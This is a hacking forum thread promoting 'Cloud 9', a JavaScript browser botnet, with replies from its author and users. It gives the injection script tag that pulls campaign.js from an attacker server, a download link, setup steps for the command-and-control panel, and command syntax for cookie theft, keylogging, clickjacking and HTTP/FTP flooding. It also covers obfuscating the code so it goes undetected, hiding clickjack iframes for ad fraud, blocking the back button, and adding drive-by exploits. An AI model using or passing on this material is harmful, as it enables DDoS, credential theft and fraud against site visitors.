How to infect a page with cloud 9 botnet:-

<script src="http://yourserver.com/campaign.js"></script>









Hello again HF!

I created a javascript botnet that has the following features:
FTP flood
Cookie stealing
Keylogging
Send POST requests
Flood POST requests
Evaluate JavaScript Code
Silently load webpages
Clickjacking (iframe follow mouse)

The commands are:
Code 
cookie
clipboard
load*[url]*[millisecond delay]*
view*[url]*
sleep*[milliseconds]*
eval*[code]*
jack*[iframe]*[width]*[height]*
md5*[hash]*[brute length]*[brute alphabet]*
sha1*[hash]*[brute length]*[brute alphabet]*
post*[url]*[params]*
floodpost*[url]*[params]*[millisecond delay]*
The millisecond delay is the delay between requests when flooding.

Here is the download link to the botnet:
http :// browsersecurity.gq/cloud9-latest.zip

Unzip the folder on you server
Then edit campaign.js and set master to your servers IP
Edit admin/panel4829.php and set a new username and password for the cnc panel

One way of getting tons of browsers on your net use traffic exchange sites like hitleap.com or 10khits.com

To FTP flood use this command:
Code 
load*ftp://website.com:80/*0*
That command will exhaust all of the connections on a webserver with only a few browsers

All keylogs that are recorded are sent once the page is closed for stealth

To infect a page simply put this html on it:
http ://pastebin .com/eDRgnxN9

Then whoever visits the page will be on the botnet for as long as they are on the page.

I suggest putting a movie on the page so people will stay on the botnet for longer. (Good for ddos attacks)

Happy hacking!

SynthMesc I have installed but "Warning: file_get_contents(../logs/online.txt): failed to open stream: No such file or directory in 21 line"

Warning: file(../logs/main.txt): failed to open stream: No such file or directory in 113 line

please any suggestion or if you have skype i need your help.

Go into the logs folder then
Create a file called online.txt and put "0" in it. Nothing but a zero.

Next create a new file called main.txt
And it should work now.

Also obfuscate your campaign.js using this JavaScript obfuscator:

ok so now is everythink okey how to use this one for g00gl3 ads "jack*[iframe]*[width]*[height]*

Basically make a button for your advertisement, then set the width to the width of the button and height to the height of the button.

Pretty simple.
If you wanna debug set:
Code 
var css = '<style>iframe { position:absolute; filter:alpha(opacity=0); opacity:0.0; border: None left:0; top:0; }</style>';
[code]
To:
[code]
var css = '<style>iframe { position:absolute; filter:alpha(opacity=50); opacity:0.5; border: None left:0; top:0; }</style>';
Ezpz





NEW DDOS FUNCTION: ANTIDDOS

The antiddos command works the same way as the load command, it can take out cloudflare sites! Or cloudflare like protected sites!

Also to obfuscate your campaign.js use this JavaScript obfuscator:

http://javascriptobfuscator.com/Javascri...cator.aspx

It will make your JavaScript botnet FUD and unreadable

As always, happy hacking

I see that the zip didnt store the folders properly, so move all the .gif files into a folder called "flags" and move "online.txt" and "main.txt" into a folder called "logs"

Once you do that the panel should work perfectly

hello.
plz tell me about load option.
can bot execute exe file after load?

No, load is used for HTTP/HTTPS flooding




AlirezaVF Wrote:  
this will be exploit kit ! when you can excute an exe file on the target

I am actually thinking of adding a vbscript download and execute to it, and since it has browser detection,I can easily target the exploits 

All updates are free as usual.



Codefuser Wrote:  
Since it is a free release and what not, thanks a lot etc.
However you must realize that a javascript botnet is extremely "bad". It has no persistence, close the browser and it is gone, does not have access to the system, etc.

Well JavaScript has extreme limitations for security, I plan to add exploits to it soon




AlirezaVF Wrote:  
add old exploits or you are plan to code new exploits?

Old, I just added a vbscript exploit for IE, I plan to add more soon



Just fixed the zip, it should work out of the box now 

Just remember to edit notFound.php, campaign.js and admin/panel4829.php




NEW UPDATE!!!

NOW HAS PERSISTENCE!!!!!

I stole some code from a malicious website so now the back button is disabled! No one can exit the page using the back button now!

Silverlight drive by has been added as well!

Cheers everyone!



SECURITY ALERT TO EVERYONE USING CLOUD 9

SEVERAL CRITICAL XSS VULNERABILITIES HAVE BEEN PATCHED. RE DOWNLOAD IMMEDIATELY

I also added iframe break out, so most traffic exchange sites will be stuck on your botnet! They won't be able to redirect to the next page

Cheers!
The javascript code and exploits are FUD

Why don't you just give up and go do website design or some shit for money instead? This is getting cancerous.

Well this is JavaScript we are talking about. There is not much you can do for persistence.







Now added glype DDoS, now you can DDoS websites using online proxies! 
Make sure you have your glype list like this:
